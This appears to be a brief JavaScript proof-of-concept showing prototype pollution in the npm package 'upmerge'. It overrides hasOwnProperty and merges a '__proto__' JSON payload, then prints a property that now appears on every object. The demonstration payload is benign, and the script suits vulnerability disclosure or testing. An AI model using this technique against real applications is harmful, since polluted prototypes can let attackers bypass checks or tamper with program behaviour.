Object.prototype.hasOwnProperty = () => true;
let upmerge = require('upmerge');
let payload = '{"__proto__":{ "polluted" : "yes" } }';
obj = {};
console.log({}.polluted);
upmerge.merge({}, JSON.parse(payload));
console.log({}.polluted);